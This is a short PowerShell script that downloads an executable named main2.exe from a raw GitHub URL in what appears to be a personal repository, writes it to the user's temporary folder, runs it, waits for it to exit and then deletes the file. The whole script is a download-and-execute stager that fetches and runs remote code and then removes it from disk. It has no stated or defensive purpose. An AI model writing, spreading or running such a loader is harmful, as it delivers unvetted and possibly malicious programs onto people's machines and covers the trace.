$exeUrl = "https://raw.githubusercontent.com/lubyralph6-maker/godpum.ps1/main/main2.exe"

$tempExe = Join-Path $env:TEMP "main2.exe"

Invoke-WebRequest -Uri $exeUrl -OutFile $tempExe

$proc = Start-Process $tempExe -PassThru

$proc.WaitForExit()

if (Test-Path $tempExe) {
    Remove-Item $tempExe -Force
}
